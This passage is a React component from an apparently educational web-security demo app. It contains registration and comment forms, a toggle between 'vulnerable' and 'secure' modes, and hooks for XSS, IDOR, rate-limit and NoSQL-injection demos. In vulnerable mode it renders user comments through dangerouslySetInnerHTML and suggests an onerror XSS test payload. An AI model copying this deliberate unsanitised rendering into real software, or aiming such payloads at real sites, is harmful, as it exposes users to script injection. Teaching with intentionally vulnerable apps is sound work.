            <label className="block text-sm font-medium text-gray-600 mb-2">Password</label>
            <input
              type="password"
              value={registerForm.password}
              onChange={(e) => setRegisterForm({ ...registerForm, password: e.target.value })}
              className="w-full px-4 py-3 rounded-lg"
              placeholder="At least 6 characters"
              minLength={6}
              required
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-600 mb-2">Confirm Password</label>
            <input
              type="password"
              value={registerForm.confirmPassword}
              onChange={(e) => setRegisterForm({ ...registerForm, confirmPassword: e.target.value })}
              className="w-full px-4 py-3 rounded-lg"
              placeholder="Re-enter your password"
              required
            />
          </div>

          <button
            type="submit"
            className="w-full px-4 py-3 bg-green-600 text-white rounded-lg hover:bg-green-600 transition font-semibold text-lg mt-2"
          >
            Create Account
          </button>
        </form>

        <div className="mt-6 text-center">
          <p className="text-gray-500 text-sm">
            Already have an account?{' '}
            <button
              onClick={() => setCurrentView('login')}
              className="text-blue-600 hover:text-blue-800 font-medium"
            >
              Login here
            </button>
          </p>
        </div>
      </div>
    </div>
  );

  const renderDashboard = () => (
    <div className="space-y-6 animate-fadeIn">
      <div className="glass-card p-6">
        <h2 className="text-2xl font-bold text-gray-800 mb-4">
          Welcome, <span className="gradient-text">{user?.username}</span>!
          <span className="text-sm font-normal text-gray-500 ml-2">({user?.role})</span>
        </h2>

        <div className="space-y-4">
          <div>
            <h3 className="text-lg font-semibold text-gray-700 mb-3">Post a Comment</h3>
            <div className="flex gap-2">
              <input
                type="text"
                value={comment}
                onChange={(e) => setComment(e.target.value)}
                placeholder="Enter your comment..."
                className="flex-1 px-4 py-3 rounded-lg"
                required
              />
              <button
                onClick={handleCommentSubmit}
                className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition font-medium"
              >
                Post
              </button>
            </div>
            {vulnerabilityMode === 'vulnerable' && (
              <div className="alert-warning mt-3">
                <p className="text-sm">
                  💡 Try XSS: &lt;img src=x onerror="alert('XSS')"&gt;
                </p>
              </div>
            )}
          </div>

          <div className="mt-6">
            <h3 className="text-lg font-semibold text-gray-700 mb-3">Comments</h3>
            <div className="space-y-3">
              {comments.length === 0 ? (
                <p className="text-gray-500 text-sm">No comments yet. Be the first to comment!</p>
              ) : (
                comments.map((c, i) => (
                  <div key={c._id || i} className="glass-light p-4 rounded-lg">
                    <p className="text-sm font-semibold text-blue-400">{c.username || c.user?.username || 'Anonymous'}</p>
                    {vulnerabilityMode === 'vulnerable' ? (
                      <div className="text-gray-600 mt-1" dangerouslySetInnerHTML={{ __html: c.text }} />
                    ) : (
                      <p className="text-gray-600 mt-1">{c.text}</p>
                    )}
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      </div>

      {user?.role === 'admin' && (
        <div>{renderAdminPanel()}</div>
      )}

      {/* Security Vulnerability Demos */}
      <div className="mt-8">
        <h2 className="text-2xl font-bold text-gray-800 mb-6 flex items-center gap-2">
          <Shield className="w-6 h-6 text-blue-600" />
          <span className="gradient-text">Security Vulnerability Demos</span>
        </h2>
        <div className="space-y-6">
          {renderXSSDemo()}
          {renderIDORDemo()}
          {renderRateLimitDemo()}
          {renderNoSQLInjectionDemo()}
        </div>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen p-6">
      {/* Animated Background */}
      <div className="animated-bg"></div>

      <div className="max-w-4xl mx-auto">
        {/* Header / Navbar */}
        <div className="navbar flex justify-between items-center flex-wrap gap-4">
          <div className="flex items-center gap-4">
            <button
              onClick={() => setCurrentView('home')}
              className="text-blue-600 hover:text-blue-800 font-semibold flex items-center gap-2 transition"
            >
              <Shield className="w-5 h-5" />
              <span className="hidden sm:inline">Security Demo</span>
            </button>
            {user && (
              <button
                onClick={handleLogout}
                className="px-4 py-2 bg-red-500 text-white rounded-lg hover:bg-red-600 text-sm transition"
              >
                Logout
              </button>
            )}
          </div>

          <div className="flex items-center gap-3">
            <span className="text-sm text-gray-500">Mode:</span>
            <button
              onClick={() => setVulnerabilityMode(vulnerabilityMode === 'vulnerable' ? 'secure' : 'vulnerable')}
              className={`mode-toggle ${vulnerabilityMode === 'vulnerable' ? 'vulnerable' : 'secure'}`}
            >
              {vulnerabilityMode === 'vulnerable' ? '🔓 Vulnerable' : '🔒 Secure'}
            </button>
          </div>
        </div>

        {/* Exploit Demo Banner */}
        {exploitDemo && (
          <div className="alert-warning mb-6 flex justify-between items-start">
            <p className="text-sm">{exploitDemo}</p>
            <button
              onClick={() => setExploitDemo('')}
              className="text-xs text-yellow-600 hover:text-yellow-800 ml-4 flex-shrink-0"
            >
              ✕ Dismiss
            </button>
          </div>
        )}

        {/* Main Content */}
        <div className="glass-card p-8">
          {currentView === 'home' && renderHome()}
          {currentView === 'login' && renderLogin()}
          {currentView === 'register' && renderRegister()}
          {currentView === 'dashboard' && renderDashboard()}
        </div>

        {/* Footer */}
        <div className="mt-8 text-center">
          <p className="text-gray-500 text-sm">Educational Security Demo - Final Year Project</p>
          <p className="mt-2 text-gray-600 text-xs">Open DevTools (F12) to inspect vulnerabilities</p>
        </div>
      </div>
    </div>
  );
}

export default VulnerableSPADemo;
